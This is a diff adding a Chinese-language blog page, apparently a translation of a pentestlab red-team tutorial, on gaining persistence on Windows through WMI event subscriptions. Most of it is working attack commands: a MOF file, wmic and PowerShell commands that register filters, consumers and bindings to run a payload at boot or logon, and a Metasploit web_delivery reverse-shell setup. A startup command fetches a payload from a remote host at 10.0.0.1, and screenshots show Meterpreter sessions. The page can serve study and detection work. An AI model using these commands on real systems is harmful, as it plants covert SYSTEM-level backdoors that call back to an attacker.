@@ -1,0 +1,712 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/logo.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="永安寺">
+  <meta name="keywords" content="">
+  
+  <title>持久性-WMI事件订阅 - Victory</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.6.0/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"txluck.github.io","root":"/","version":"1.8.10","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"NnQfFjLx8ctoF1RbDVgWqADt-gzGzoHsz","app_key":"0Lsfi2upctErQTQC8xHAMnIs","server_url":"https://nnqffjlx.lc-cn-n1-shared.com"}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Victory's Note</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="持久性-WMI事件订阅">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-author" aria-hidden="true"></i>
+      永安寺
+    </span>
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2022-03-28 20:03" pubdate>
+        2022年3月28日 晚上
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      3k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      38
+       分钟
+    </span>
+  
+
+  
+  
+    
+      <!-- LeanCloud 统计文章PV -->
+      <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+        <i class="iconfont icon-eye" aria-hidden="true"></i>
+        <span id="leancloud-page-views"></span> 次
+      </span>
+    
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">持久性-WMI事件订阅</h1>
+            
+            <div class="markdown-body">
+              <p>Windows Management Instrumentation (WMI) 使系统管理员能够在本地和远程执行任务。从红队的角度来看，WMI 可用于执行多种活动，例如横向移动、持久性、态势感知、代码执行以及作为<a target="_blank" rel="noopener" href="https://pentestlab.blog/2017/11/20/command-and-control-wmi/">命令和控制</a>(C2)。WMI 是几乎所有 Windows 操作系统（Windows 98-Windows 10）中都存在的 Windows 的一部分，这一事实使这些攻击性活动远离蓝队的雷达。</p>
+<p>通常，通过 WMI 事件订阅的持久性需要创建以下三个类，它们用于存储有效负载或任意命令，指定将触发有效负载的事件并将两个类（__EventConsumer &amp;__EventFilter）关联起来，以便执行和触发绑定一起。</p>
+<ul>
+<li><strong>__EventFilter</strong> // 触发器（新进程、登录失败等）</li>
+<li><strong>EventConsumer</strong> // 执行动作（执行有效载荷等）</li>
+<li><strong>__FilterToConsumerBinding</strong> // 绑定过滤器和消费者类</li>
+</ul>
+<p>这种技术的实现不需要任何工具包，因为 Windows 有一个可以与 WMI (wmic) 交互的实用程序，并且也可以利用 PowerShell。然而，各种框架，如 Metasploit、Empire、PoshC2、PowerSploit 和多个 PowerShell 脚本和 C# 工具可用于自动化此技术，为代码执行提供不同的触发器和各种选项。应该注意的是，WMI 事件作为 SYSTEM 运行，在重新启动后持续存在，并且需要管理员级别的权限才能使用此技术。</p>
+<h2 id="MOF"><a href="#MOF" class="headerlink" title="MOF"></a>MOF</h2><p>托管对象格式 (MOF) 是用于描述 CIM（通用信息模型）类的语言。MOF 文件通常包含语句。编译文件时添加到 WMI 存储库 (OBJECTS.DATA) 的类和类实例（mofcomp.exe 可以编译 MOF 文件，它是 Windows 的一部分）。MOF 文件的内容如下所示：</p>
+<figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs smali"><span class="hljs-comment">#PRAGMA NAMESPACE (&quot;////.//root//subscription&quot;)</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">instance </span>of CommandLineEventConsumer as $Cons<br>&#123;<br>  ``Name = <span class="hljs-string">&quot;Pentestlab&quot;</span>;<br>  ``RunInteractively=false;<br>  ``Command<span class="hljs-class">LineTemplate=&quot;cmd.exe&quot;;</span><br>&#125;;<span class="hljs-built_in"></span><br><span class="hljs-built_in">instance </span>of __EventFilter as $Filt<br>&#123;<br>  ``Name = <span class="hljs-string">&quot;Pentestlab&quot;</span>;<br>  ``EventNamespace = <span class="hljs-string">&quot;root//subscription&quot;</span>;<br>  ``Query =<span class="hljs-string">&quot;SELECT * FROM __InstanceCreationEvent Within 3&quot;</span><br>      ``<span class="hljs-string">&quot;Where TargetInstance Isa /&quot;</span>Win32_Process/<span class="hljs-string">&quot; &quot;</span><br>      ``<span class="hljs-string">&quot;And Targetinstance.Name = /&quot;</span>notepad.exe/<span class="hljs-string">&quot; &quot;</span>;<br>  ``Query<span class="hljs-class">Language = &quot;WQL&quot;;</span><br>&#125;;<span class="hljs-built_in"></span><br><span class="hljs-built_in">instance </span>of __FilterToConsumerBinding<br>&#123; <br>   ``Filter = $Filt;<br>   ``Consumer = $Cons;<br>&#125;;<br></code></pre></td></tr></table></figure>
+
+<p>上面的 MOF 文件会在系统上创建 notepad.exe 进程时执行 cmd.exe。MOF 文件可以通过执行以下命令部署到 WMI 存储库中：</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">mofcomp.exe <span class="hljs-string">./wmi.mof</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2022/03/28/%E6%8C%81%E4%B9%85%E6%80%A7-WMI%E4%BA%8B%E4%BB%B6%E8%AE%A2%E9%98%85/image-20220328200653939.png" srcset="/img/loading.gif" lazyload alt="image-20220328200653939"></p>
+<p>或者，Metasploit 框架还具有生成恶意 MOF 文件的能力。从交互式 ruby 控制台执行以下命令将生成 MOF。</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function">irb</span><br><span class="hljs-function">puts <span class="hljs-title">generate_mof</span><span class="hljs-params">(<span class="hljs-string">&quot;Metasploit1&quot;</span>,<span class="hljs-string">&quot;Metasploit2&quot;</span>)</span></span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2022/03/28/%E6%8C%81%E4%B9%85%E6%80%A7-WMI%E4%BA%8B%E4%BB%B6%E8%AE%A2%E9%98%85/image-20220328201010959.png" srcset="/img/loading.gif" lazyload alt="image-20220328201010959"></p>
+<p>Microsoft 实用程序“ <em><strong>mofcomp.exe/</strong></em> ”可以编译 MOF 文件。该文件将自动存储在 WMI 存储库中，并且恶意负载/命令将自动执行。</p>
+<p><code>mofcomp.exe ./Metasploit.mof</code></p>
+<p><img src="/2022/03/28/%E6%8C%81%E4%B9%85%E6%80%A7-WMI%E4%BA%8B%E4%BB%B6%E8%AE%A2%E9%98%85/image-20220328201352970.png" srcset="/img/loading.gif" lazyload alt="image-20220328201352970"></p>
+<p><em><strong>在这种情况下，payload 是通过 Metasploit “ web_delivery/</strong></em> ”模块使用 regsvr32 方法远程获取的。编译 MOF 文件后，立即生成了一个 Meterpreter 会话。</p>
+<p><img src="/2022/03/28/%E6%8C%81%E4%B9%85%E6%80%A7-WMI%E4%BA%8B%E4%BB%B6%E8%AE%A2%E9%98%85/image-20220328201406000.png" srcset="/img/loading.gif" lazyload alt="image-20220328201406000"></p>
+<p>尽管一些 APT 的小组使用 MOF 文件作为 dropper 以实现 WMI 的持久性，但不建议将其作为一种方法。通过 WMI 事件订阅的持久性可以通过使用常见的 Microsoft 实用程序来实现，因此无需将文件放入磁盘。</p>
+<h2 id="Command-Prompt"><a href="#Command-Prompt" class="headerlink" title="Command Prompt"></a>Command Prompt</h2><p>由于所有 Windows 操作系统都包含命令行实用程序 (wmic)，因此可以通过命令提示符执行与 WMI 的交互。执行以下命令将在<em>“ <strong>root/subscription</strong> ”</em>的名称空间中创建三个事件。每次 Windows 启动时，任意有效负载将在 60 秒内执行。</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">wmic /NAMESPACE:&quot;//root/subscription&quot; <span class="hljs-type">PATH</span> __EventFilter <span class="hljs-keyword">CREATE</span> <span class="hljs-type">Name</span>=&quot;PentestLab&quot;, EventNameSpace=&quot;root/cimv2&quot;,QueryLanguage=&quot;WQL&quot;, Query=&quot;SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA &#x27;Win32_PerfFormattedData_PerfOS_System&#x27;&quot;<br><br>wmic /NAMESPACE:&quot;//root/subscription&quot; <span class="hljs-type">PATH</span> CommandLineEventConsumer <span class="hljs-keyword">CREATE</span> <span class="hljs-type">Name</span>=&quot;PentestLab&quot;, ExecutablePath=&quot;C:/Windows/System32/pentestlab.exe&quot;,CommandLineTemplate=&quot;C:/Windows/System32/pentestlab.exe&quot;<br><br>wmic /NAMESPACE:&quot;//root/subscription&quot; <span class="hljs-type">PATH</span> __FilterToConsumerBinding <span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">Filter</span>=&quot;__EventFilter.Name=/&quot;PentestLab/&quot;&quot;, Consumer=&quot;CommandLineEventConsumer.Name=/&quot;PentestLab/&quot;&quot;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2022/03/28/%E6%8C%81%E4%B9%85%E6%80%A7-WMI%E4%BA%8B%E4%BB%B6%E8%AE%A2%E9%98%85/image-20220328201541699.png" srcset="/img/loading.gif" lazyload alt="image-20220328201541699"></p>
+<p>每次重启后，可执行文件将在 60 秒内返回 Meterpreter 会话。</p>
+<p><img src="/2022/03/28/%E6%8C%81%E4%B9%85%E6%80%A7-WMI%E4%BA%8B%E4%BB%B6%E8%AE%A2%E9%98%85/image-20220328201632298.png" srcset="/img/loading.gif" lazyload alt="image-20220328201632298"></p>
+<h2 id="PowerShell"><a href="#PowerShell" class="headerlink" title="PowerShell"></a>PowerShell</h2><p>PowerShell 包含可以查询 WMI 对象并将信息检索回控制台的 cmdlet。以下命令可用于验证是否已创建任意事件以及恶意负载/命令是否存储在 WMI 存储库中。</p>
+<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">Get-WMIObject` `-Namespace` `root/Subscription` `-Class` `__EventFilter<br>Get-WMIObject` `-Namespace` `root/Subscription` `-Class` `__FilterToConsumerBinding<br>Get-WMIObject` `-Namespace` `root/Subscription` `-Class` `__EventConsumer<br></code></pre></td></tr></table></figure>
+
+<p>也可以通过 PowerShell 直接实现此技术。以下脚本块将在每次 Windows 启动后的 5 分钟内执行任意可执行文件“ <em><strong>pentestlab.exe ”。/</strong></em></p>
+<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">$FilterArgs` `= @&#123;name=``&#x27;Pentestlab-WMI&#x27;``<span class="hljs-comment">;</span><br>        ``EventNameSpace=``&#x27;root/CimV2&#x27;``<span class="hljs-comment">;</span><br>        ``QueryLanguage=``<span class="hljs-string">&quot;WQL&quot;</span>``<span class="hljs-comment">;</span><br>        ``Query=``<span class="hljs-string">&quot;SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA &#x27;Win32_PerfFormattedData_PerfOS_System&#x27; AND TargetInstance.SystemUpTime &gt;= 240 AND TargetInstance.SystemUpTime &lt; 325&quot;</span>``&#125;<span class="hljs-comment">;</span><br>$Filter``=``<span class="hljs-keyword">New</span>-CimInstance` `-Namespace` `root/subscription` `-ClassName` `__EventFilter` `-Property` `$FilterArgs<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">$ConsumerArgs` `= @&#123;name=``&#x27;Pentestlab-WMI&#x27;``<span class="hljs-comment">;</span><br>        ``CommandLineTemplate=``<span class="hljs-string">&quot;$($Env:SystemRoot)/System32/pentestlab.exe&quot;</span>``<span class="hljs-comment">;&#125;</span><br>$Consumer``=``<span class="hljs-keyword">New</span>-CimInstance` `-Namespace` `root/subscription` `-ClassName` `CommandLineEventConsumer` `-Property` `$ConsumerArgs<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">$FilterToConsumerArgs` `= @&#123;<br>Filter` `= ``[Ref]` `$Filter``<span class="hljs-comment">;</span><br>Consumer = ``[Ref]` `$Consumer``<span class="hljs-comment">;</span><br>&#125;<br>$FilterToConsumerBinding` `= ``<span class="hljs-keyword">New</span>-CimInstance` `-Namespace` `root/subscription` `-ClassName` `__FilterToConsumerBinding` `-Property` `$FilterToConsumerArgs<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2022/03/28/%E6%8C%81%E4%B9%85%E6%80%A7-WMI%E4%BA%8B%E4%BB%B6%E8%AE%A2%E9%98%85/image-20220328201726488.png" srcset="/img/loading.gif" lazyload alt="image-20220328201726488"></p>
+<p>可以执行以下命令来执行清理并删除创建的 WMI 对象。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$EventConsumerToCleanup</span> = <span class="hljs-built_in">Get-WmiObject</span> <span class="hljs-literal">-Namespace</span> root/subscription <span class="hljs-literal">-Class</span> CommandLineEventConsumer <span class="hljs-literal">-Filter</span> <span class="hljs-string">&quot;Name = &#x27;Pentestlab-WMI&#x27;&quot;</span><br><br><span class="hljs-variable">$EventFilterToCleanup</span> = <span class="hljs-built_in">Get-WmiObject</span> <span class="hljs-literal">-Namespace</span> root/subscription <span class="hljs-literal">-Class</span> __EventFilter <span class="hljs-literal">-Filter</span> <span class="hljs-string">&quot;Name = &#x27;Pentestlab-WMI&#x27;&quot;</span><br><br><span class="hljs-variable">$FilterConsumerBindingToCleanup</span> = <span class="hljs-built_in">Get-WmiObject</span> <span class="hljs-literal">-Namespace</span> root/subscription <span class="hljs-literal">-Query</span> <span class="hljs-string">&quot;REFERENCES OF &#123;<span class="hljs-variable">$</span>(<span class="hljs-variable">$EventConsumerToCleanup</span>.__RELPATH)&#125; WHERE ResultClass = __FilterToConsumerBinding&quot;</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-meta"><span class="hljs-meta-keyword">$FilterConsumerBindingToCleanup</span> | Remove-WmiObject</span><br><span class="hljs-meta"><span class="hljs-meta-keyword">$EventConsumerToCleanup</span> | Remove-WmiObject</span><br><span class="hljs-meta"><span class="hljs-meta-keyword">$EventFilterToCleanup</span> | Remove-WmiObject</span><br></code></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://github.com/jaredhaight/PowerPunch">PowerPunch</a>是 PowerShell 脚本的集合，其中包含用于通过 WMI 进行持久性的 PowerShell 脚本。然而，该脚本需要将<a target="_blank" rel="noopener" href="https://github.com/jaredhaight/Invoke-MetasploitPayload">Invoke-MetasploitPayload</a>加载到内存中，并且负载将从远程位置下载。可以配置Metasploit 框架“ <em><strong>web_delivery ”模块来托管基于 PowerShell 的有效负载。</strong></em></p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs routeros">use exploit/multi/script/web_delivery<br><span class="hljs-builtin-name">set</span> SRVHOST 0.0.0.0<br><span class="hljs-builtin-name">set</span> SRVPORT 8443<br><span class="hljs-builtin-name">set</span> SSL <span class="hljs-literal">true</span><br><span class="hljs-builtin-name">set</span> target 2<br><span class="hljs-builtin-name">set</span> URIPATH pentestlab<br><span class="hljs-builtin-name">set</span> payload windows/x64/meterpreter/reverse_tcp<br><span class="hljs-builtin-name">set</span> LPORT 8888<br><span class="hljs-builtin-name">set</span> LHOST 10.0.0.1<br><span class="hljs-builtin-name">run</span> -j<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2022/03/28/%E6%8C%81%E4%B9%85%E6%80%A7-WMI%E4%BA%8B%E4%BB%B6%E8%AE%A2%E9%98%85/image-20220328201803849.png" srcset="/img/loading.gif" lazyload alt="image-20220328201803849"></p>
+<p>以下命令将注册 WMI 事件订阅，并将存储将在启动期间执行的命令，以创建无文件持久性。</p>
+<figure class="highlight monkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs monkey"><span class="hljs-keyword">Import</span>-<span class="hljs-keyword">Module</span> ./Invoke-MetasploitPayload.ps1<br><span class="hljs-keyword">Import</span>-<span class="hljs-keyword">Module</span> ./<span class="hljs-keyword">New</span>-WMIPersistence.ps1<br><span class="hljs-keyword">New</span>-WMIPersistence -Name Pentestlab -OnStartup -Command <span class="hljs-string">&quot;C:/Windows/System32/WindowsPowerShell/v1.0/powershell.exe&quot;</span> -Arguments <span class="hljs-string">&quot;-Command Invoke-MetasploitPayload https://10.0.0.1:8443/pentestlab&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2022/03/28/%E6%8C%81%E4%B9%85%E6%80%A7-WMI%E4%BA%8B%E4%BB%B6%E8%AE%A2%E9%98%85/image-20220328201942160.png" srcset="/img/loading.gif" lazyload alt="image-20220328201942160"></p>
+<p>有效负载将在启动期间传递到目标主机上。</p>
+<p><img src="/2022/03/28/%E6%8C%81%E4%B9%85%E6%80%A7-WMI%E4%BA%8B%E4%BB%B6%E8%AE%A2%E9%98%85/image-20220328202002342.png" srcset="/img/loading.gif" lazyload alt="image-20220328202002342"></p>
+<p>Wmi <a target="_blank" rel="noopener" href="https://github.com/subesp0x10/Wmi-Persistence">-Persistence</a>是一个简单的 PowerShell 脚本，支持以下触发器：启动、登录、间隔和定时。它包含三个功能，用于安装、查看和删除已创建的 WMI 事件。</p>
+<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">Install-Persistence` `-Trigger` `Startup` `-Payload` `&quot;c:/windows/system32/pentestlab.exe<span class="hljs-string">&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2022/03/28/%E6%8C%81%E4%B9%85%E6%80%A7-WMI%E4%BA%8B%E4%BB%B6%E8%AE%A2%E9%98%85/image-20220328202018419.png" srcset="/img/loading.gif" lazyload alt="image-20220328202018419"></p>
+<p>“***启动/***”触发器默认会在启动后五分钟内执行任意有效载荷。</p>
+<p><img src="/2022/03/28/%E6%8C%81%E4%B9%85%E6%80%A7-WMI%E4%BA%8B%E4%BB%B6%E8%AE%A2%E9%98%85/image-20220328202030401.png" srcset="/img/loading.gif" lazyload alt="image-20220328202030401"></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/n0pe-sled/WMI-Persistence">WMI-Persistence</a>是另一个 PowerShell 脚本，它可以创建事件过滤器，在每次重新启动后 5 分钟内从远程位置执行基于 PowerShell 的有效负载。</p>
+<figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-built_in">Import</span><span class="hljs-operator">-</span><span class="hljs-built_in">Module</span>	<span class="hljs-operator">./</span><span class="hljs-variable">WMI</span><span class="hljs-operator">-</span><span class="hljs-variable">Persistence</span><span class="hljs-operator">.</span><span class="hljs-variable">ps1</span><br><span class="hljs-built_in">Install</span><span class="hljs-operator">-</span><span class="hljs-variable">Persistence</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2022/03/28/%E6%8C%81%E4%B9%85%E6%80%A7-WMI%E4%BA%8B%E4%BB%B6%E8%AE%A2%E9%98%85/image-20220328202111398.png" srcset="/img/loading.gif" lazyload alt="image-20220328202111398"></p>
+<p>该脚本包含一个查看 WMI 对象的函数，以确保已正确创建任意类。</p>
+<p><code>Check-WMI</code></p>
+<p><img src="/2022/03/28/%E6%8C%81%E4%B9%85%E6%80%A7-WMI%E4%BA%8B%E4%BB%B6%E8%AE%A2%E9%98%85/image-20220328202242220.png" srcset="/img/loading.gif" lazyload alt="image-20220328202242220"></p>
+<p>下次重新启动 5 分钟后，有效负载将被传递，并且将与目标主机建立 Meterpreter 会话。</p>
+<p><img src="/2022/03/28/%E6%8C%81%E4%B9%85%E6%80%A7-WMI%E4%BA%8B%E4%BB%B6%E8%AE%A2%E9%98%85/image-20220328202255321.png" srcset="/img/loading.gif" lazyload alt="image-20220328202255321"></p>
+<p><a target="_blank" rel="noopener" href="https://twitter.com/infosecn1nja">Rahmat Nurfauzi</a>开发了一个 PowerShell 脚本 ( <a target="_blank" rel="noopener" href="https://gist.github.com/infosecn1nja/d9a42a68e9d3671e1fbadee5d7dc8964">WMI-Persistence )，它默认使用</a><a target="_blank" rel="noopener" href="https://pentestlab.blog/2017/05/11/applocker-bypass-regsvr32/">regsvr32</a>方法执行任意命令，以便从远程服务器运行任意脚本。</p>
+<p>./WMI-Persistence</p>
+<p><img src="/2022/03/28/%E6%8C%81%E4%B9%85%E6%80%A7-WMI%E4%BA%8B%E4%BB%B6%E8%AE%A2%E9%98%85/image-20220328202310689.png" srcset="/img/loading.gif" lazyload alt="image-20220328202310689"></p>
+<p>“ <em><strong>Get-WMIObject</strong></em> ” cmdlet 将确保已创建事件过滤器，因为脚本不提供任何控制台输出。</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">Get</span>-WMIObject -Namespace root/<span class="hljs-keyword">Subscription</span> -<span class="hljs-keyword">Class</span> __EventFilter<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2022/03/28/%E6%8C%81%E4%B9%85%E6%80%A7-WMI%E4%BA%8B%E4%BB%B6%E8%AE%A2%E9%98%85/image-20220328202327998.png" srcset="/img/loading.gif" lazyload alt="image-20220328202327998"></p>
+<p>Metasploit 框架可用于托管 scriptlet 并获取会话。然而，其他命令和控制框架（例如 PoshC2）具有类似的功能，并且可以捕获 regsvr32 有效负载。</p>
+<p><img src="/2022/03/28/%E6%8C%81%E4%B9%85%E6%80%A7-WMI%E4%BA%8B%E4%BB%B6%E8%AE%A2%E9%98%85/image-20220328202339048.png" srcset="/img/loading.gif" lazyload alt="image-20220328202339048"></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/Sw4mpf0x/PowerLurk">PowerLurk</a>是另一个支持五个触发器的 PowerShell 脚本。它们是：<em>InsertUSB</em>、<em>UserLogon</em>、<em>Timed</em>、<em>Interval</em>和<em>ProcessStart</em>。该脚本使用 WMI 存储库来存储恶意命令，该命令将执行任意脚本、可执行文件或任何其他带有参数的命令。以下函数将检索所有活动的 WMI 事件对象。</p>
+<p><code>Get-WmiEvent</code></p>
+<p><img src="/2022/03/28/%E6%8C%81%E4%B9%85%E6%80%A7-WMI%E4%BA%8B%E4%BB%B6%E8%AE%A2%E9%98%85/image-20220328202513598.png" srcset="/img/loading.gif" lazyload alt="image-20220328202513598"></p>
+<p>执行以下命令将创建一个任意事件订阅，该订阅将在 Windows 登录期间永久执行恶意负载。</p>
+<p><code>Register-MaliciousWmiEvent -EventName Logonlog -PermanentCommand &quot;pentestlab.exe&quot; -Trigger UserLogon -Username any</code></p>
+<p><img src="/2022/03/28/%E6%8C%81%E4%B9%85%E6%80%A7-WMI%E4%BA%8B%E4%BB%B6%E8%AE%A2%E9%98%85/image-20220328202535278.png" srcset="/img/loading.gif" lazyload alt="image-20220328202535278"></p>
